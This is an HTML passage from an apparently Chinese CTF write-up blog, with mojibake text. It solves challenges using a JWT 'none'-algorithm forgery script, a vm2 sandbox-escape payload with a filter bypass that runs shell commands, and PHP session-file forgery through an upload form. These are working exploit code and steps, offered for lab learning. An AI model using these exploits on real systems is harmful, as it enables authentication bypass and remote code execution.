&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>jwtå¯ä»¥é€šè¿‡è¿™ä¸ªç½‘ç«™è§£æï¼š<a class="foo" target="_blank" href="https://jwt.io/">ä¼ é€é—¨</a></p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423184848460.png" alt="image-20200423184848460" style="high:80%;width:80%;" />

<p>äº†è§£JWTçš„ç»„æˆåï¼Œæˆ‘ä»¬æ€»ç»“JWTå¯èƒ½å­˜åœ¨å¦‚ä¸‹çš„å®‰å…¨é—®é¢˜ï¼š</p>
<blockquote>
<p>1.ä¿®æ”¹å¤´ä»€ä¹ˆçš„ç®—æ³•ä¸ºnone</p>
<p>2.è‹¥secretè¾ƒçŸ­å¯ä»¥ç›´æ¥ä½¿ç”¨<a class="foo" target="_blank" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
<p>3.ç§˜é’¥æ³„éœ²</p>
<p>3.ä¿®æ”¹ç®—æ³•RS256ä¸ºHS256</p>
</blockquote>
<p>åœ¨è¿™é“é¢˜ä¸­æ˜æ˜¾æ˜¯ä¿®æ”¹ç®—æ³•ä¸ºnoneè¿›è¡Œç»•è¿‡ã€‚</p>
<p>è¿™é‡Œå°±æ˜¯æ³¨å†Œçš„æ—¶å€™ä¼šç”Ÿæˆä¸€ä¸ªjwtï¼Œç™»å½•çš„æ—¶å€™éªŒè¯è¿™ä¸ªjwtã€‚</p>
<p>è¿™é‡Œå†™ä¸€ä¸ªè„šæœ¬æ„é€ å‡ºjwt</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line">secretid=<span class="number">0.5</span>;</span><br><span class="line">username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">password=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">rolled=<span class="string">&quot;no&quot;</span></span><br><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password,rolled&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;none&#x27;</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(token);</span><br><span class="line"><span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString());</span><br><span class="line"><span class="built_in">console</span>.log(sid)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç„¶åå†æäº¤ä¸Šé¢ç”Ÿæˆçš„JWTï¼Œå› ä¸ºä¸èƒ½è®©<code>global.secrets</code>è¿™ä¸ªæ•°ç»„ä¸º<code>undefined</code>ï¼Œæˆ‘ä»¬éœ€è¦æ³¨å†Œä¸€ä¸ªè´¦å·æ˜¯çš„å…¶åˆå§‹åŒ–ã€‚</p>
<p>åŸç†æ˜¯ç”¨å°æ•°ç»•è¿‡ secretid çš„é™åˆ¶ï¼Œå°† secret ç½®ç©ºã€‚å‘ç°æœ¬é¢˜è€ƒç‚¹ä¸ºåˆ©ç”¨ node çš„ jsonwebtoken åº“çš„å·²çŸ¥ç¼ºé™·ï¼šå½“ jwt secret ä¸ºç©ºæ—¶ï¼Œjsonwebtoken ä¼šé‡‡ç”¨ algorithm none è¿›è¡Œè§£å¯†ã€‚</p>
<p>ä¼ªé€  secretid ä¸ºå°æ•°çš„ tokenï¼Œè®© secret æˆä¸º undefinedï¼Œå¯¼è‡´ algorithm ä¸º none è¿›è€Œä½¿ç”¨æˆ·å˜æˆ admin</p>
<p>ç„¶åè¿™æ˜¯è„šæœ¬ç”Ÿæˆçš„jwtï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6MC41LCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGxlZCI6Im5vIiwiaWF0IjoxNTg3NjQ0MDk4fQ.</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ”¹åŒ…å‘é€ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423211337775.png" alt="image-20200423211337775" style="high:80%;width:80%;" />

<p>å†æ”¾åŒ…æ”¾åˆ°homeè¿™ä¸ªé¡µé¢å°±å¯ä»¥åˆ·æ–°ç½‘é¡µè¿›å…¥getflagçš„ç•Œé¢äº†ã€‚å†æŠ“getflagçš„åŒ…å‘é€å³å¯çœ‹åˆ°flagã€‚</p>
<p>è¿™ä¸Šé¢æ˜¯å¸ˆå…„çš„æ€è·¯ï¼Œå®˜æ–¹çš„è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">base_url = <span class="string">&quot;http://290fb4fb-dc63-46e7-988d-37edb35934ad.node3.buuoj.cn&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">res = s.post(base_url+<span class="string">&#x27;/api/register&#x27;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;hhh&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hhh&quot;</span>&#125;)</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>:<span class="number">0.333</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">res = s.post(base_url+<span class="string">&#x27;/api/login&#x27;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;authorization&quot;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line">res = s.get(base_url+<span class="string">&#x27;/api/flag&#x27;</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è¿è¡Œä¹Ÿå¯ä»¥å¾—åˆ°flagã€‚</p>
<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a><strong>just_escape</strong></h3><p>æ‰“å¼€F12å‘ç°è¿™ä¸ªï¼šX-Powered-Byï¼šExpress</p>
<p>è¿è¡Œä»£ç  <code>run.php?code=Error().stack</code> æ ¹æ®æŠ¥é”™ä¿¡æ¯å‘ç°æ˜¯ vm2 çš„æ²™ç›’é€ƒé€¸é—®é¢˜ã€‚æœç´¢å¯å¾— vm2 æœ€æ–°æ²™ç›’é€ƒé€¸ pocï¼š<a class="foo" target="_blank" href="https://github.com/patriksimek/vm2/issues/225">ä¼ é€é—¨</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä½¿ç”¨çš„è¯å‘ç°å­˜åœ¨waf:</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423213317676.png" alt="image-20200423213317676" style="high:80%;width:80%;" />

<p>fuzzå‘ç°ç¨‹åºè¿‡æ»¤äº†ä»¥ä¸‹å…³é”®å­—ï¼š</p>
<p>process, exec, eval, constructor, prototype, Function, åŠ å·, åŒå¼•å·, å•å¼•å·è¢«è¿‡æ»¤</p>
<p>ç»•è¿‡æ–¹å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>

<p>æœ€åä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">         <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘ç°å…¶ä»–äººçš„writeupç›´æ¥åœ¨codeåé¢åŠ ä¸ª[]å°±å¯ä»¥äº†ã€‚emmm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://90694257-8da6-479a-9ea9-cc97c08e88cd.node3.buuoj.cn/run.php?code[]=(function()&#123;</span><br><span class="line">    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.<span class="keyword">from</span>(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<h3 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a><strong>BabyUpload</strong></h3><p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">&quot;/&quot;</span>.$_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚ä½•å¾—åˆ°flagå‘¢ï¼Œ<code>session</code>å¿…é¡»å¾—æ˜¯<code>admin</code>å…¶æ¬¡å¿…é¡»å­˜åœ¨success.txtã€‚</p>
<p>é¦–å…ˆè¿™é‡Œä¸¤ä¸ªPOSTå‚æ•°ï¼Œdirectionæ˜¯ç”¨æ¥é€‰æ‹©ä¸Šä¼ æˆ–è¯»å–çš„ï¼Œatträ¼šè¢«æ‹¼æ¥åˆ°è·¯å¾„ä¸­ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br></pre></td></tr></table></figure>

<p>å†çœ‹uploadçš„éƒ¨åˆ†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            throw new RuntimeException(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šå°†è·¯å¾„æ‹¼æ¥ï¼Œä¹Ÿå°±æ˜¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/var/babyctf/$_POST[<span class="string">&#x27;attr&#x27;</span>]/æ–‡ä»¶å_sha256(ä¸´æ—¶æ–‡ä»¶å)</span><br></pre></td></tr></table></figure>

<p>ä»æºç å¼€å¤´çš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—çŸ¥ä¿®æ”¹atträ¸ºç©ºï¼Œæ–‡ä»¶åä¸ºsessï¼Œä¾¿å¯ä»¥ä¼ªé€ sessionæ–‡ä»¶ã€‚</p>
<p>ä¸‹ä¸€æ­¥å°±æ˜¯åˆ©ç”¨downloadè¯»å–è‡ªå·±çš„sessionï¼Œå‘ç°sessionå†…å®¹æ ¼å¼ï¼Œå¾—çŸ¥sessionå¼•èµ·ä¸ºphp_binaryã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424145858004.png" alt="image-20200424145858004" style="high:60%;width:60%;" />

<p>åœ¨æºä»£ç é‡Œé¢æ˜¯è¿™æ ·çš„</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424145951565.png" alt="image-20200424145951565" style="high:60%;width:60%;" />

<p>ç„¶åç›´æ¥å¤åˆ¶å‡ºæ¥ä¿å­˜åœ¨sessçš„æ–‡ä»¶é‡Œé¢ï¼Œå¹¶æŠŠguestæ”¹ä¸ºadminã€‚å¹¶ä¸Šä¼ åˆ°é¶æœºä¸Šé¢ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150334856.png" alt="image-20200424150334856" style="high:80%;width:80%;" />

<p>ç„¶åå¯ä»¥æµ‹è¯•å‡ºæ¥sessçš„æ–‡ä»¶çš„hashå€¼ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150522602.png" alt="image-20200424150522602" style="high:80%;width:80%;" />

<p>ç„¶åå¯ä»¥ç”¨downloadçš„æ–¹å¼æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦ä¸Šä¼ æˆåŠŸäº†ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150642155.png" alt="image-20200424150642155" style="high:80%;width:80%;" />

<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150705164.png" alt="image-20200424150705164" style="high:80%;width:80%;" />

<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸæ”¹ä¸ºadminã€‚</p>
<p>ä¸è¿‡è¿˜éœ€è¦æœ‰ä¸€ä¸ªsuccess.txtï¼Œç”±äºä»–è¿™é‡Œç”¨çš„æ˜¯file_existsï¼Œæ‰€ä»¥æˆ‘ä»¬ä»¤attr=success.txtä½¿ä¹‹æˆä¸ºä¸€ä¸ªè·¯å¾„ä¹Ÿèƒ½é€šè¿‡æ£€æµ‹ã€‚ç„¶åè¿™é‡Œçš„æ–‡ä»¶éšä¾¿å¡«å°±è¡Œã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424154207639.png" alt="image-20200424154207639" style="high:80%;width:80%;" />

<p>è¿™æ ·ä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³äº†ï¼ŒæŠ“åŒ…æ”¹PHPSESSIDå³å¯å¾—åˆ°flagã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424154520097.png" alt="image-20200424154520097" style="high:80%;width:80%;" />

<h2 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a><strong>MRCTF</strong></h2><h3 id="ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"><a href="#ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—" class="headerlink" title="ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"></a><strong>ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—</strong></h3><p>ç”¨010æ‰“å¼€åæ”¹ä¸€ä¸‹å‘ç°æ–‡ä»¶å¤´è¢«æ”¹ï¼ŒæŠŠ61 52æ”¹ä¸º52 61å³å¯ã€‚</p>
<p>ç„¶åå‘ç°æ‰“å¼€docxï¼Œæ˜¾ç¤ºéšè—æ–‡å­—ï¼Œç„¶åå‘ç°ä¸€æ®µéŸ³ç¬¦ï¼š</p>
<p>â™­â™¯â™ªâ€–Â¶â™¬â™­â™­â™ªâ™­â€–â€–â™­â™­â™¬â€–â™«â™ªâ€–â™©â™¬â€–â™¬â™¬â™­â™­â™«â€–â™©â™«â€–â™¬â™ªâ™­â™­â™­â€–Â¶âˆ®â€–â€–â€–â€–â™©â™¬â€–â™¬â™ªâ€–â™©â™«â™­â™­â™­â™­â™­Â§â€–â™©â™©â™­â™­â™«â™­â™­â™­â€–â™¬â™­â€–Â¶Â§â™­â™­â™¯â€–â™«âˆ®â€–â™¬Â¶â€–Â¶âˆ®â€–â™¬â™«â€–â™«â™¬â€–â™«â™«Â§=</p>
<p>ç„¶åç›´æ¥åœ¨è¿™ä¸ªç½‘ç«™è§£å¯†å³å¯å¾—åˆ°flagï¼š<a class="foo" target="_blank" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">ä¼ é€é—¨</a></p>
<h3 id="ä¸çœ ä¹‹å¤œ"><a href="#ä¸çœ ä¹‹å¤œ" class="headerlink" title="ä¸çœ ä¹‹å¤œ"></a><strong>ä¸çœ ä¹‹å¤œ</strong></h3><p>æ‰“å¼€ä¹‹åå‘ç°æœ‰å¾ˆå¤šå›¾ç‰‡ï¼Œç›´æ¥ä½¿ç”¨å‘½ä»¤åˆåœ¨ä¸€èµ·</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">montage *.jpg -geometry +<span class="number">0</span>+<span class="number">0</span>+<span class="number">0</span> ok.jpg</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨gapsè¿™ä¸ªå·¥å…·è‡ªåŠ¨æ‹¼å›¾ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gaps --image=ok.jpg --generations=<span class="number">50</span> --population=<span class="number">120</span> --size=<span class="number">50</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯»æ‰¾xxx"><a href="#å¯»æ‰¾xxx" class="headerlink" title="å¯»æ‰¾xxx"></a><strong>å¯»æ‰¾xxx</strong></h3><p>æ‰“å¼€wavæ–‡ä»¶ç”µè¯æ‹¨å·å£°ï¼Œç›´æ¥æ‰”dtmfè¯»å–å‡ºæ¥ï¼Œç„¶åæ‰‹åŠ¨å»é‡ï¼Œå› ä¸ºæœ‰å¹²æ‰°å£°ã€‚å·¥å…·ï¼š<a class="foo" target="_blank" href="https://github.com/hfeeki/dtmf">ä¼ é€é—¨</a></p>
<p>ä½¿ç”¨å·¥å…·çš„æ—¶å€™åœ¨dtmf-decoder.pyæ–‡ä»¶é‡Œé¢æŠŠï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># load wav file</span></span><br><span class="line">    wav = wave.open(<span class="string">&#x27;1.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>1.wavæ¢æˆé¢˜ç›®çš„wavå³å¯ã€‚ç»“æœä¸ºï¼š18684221609ã€‚</p>
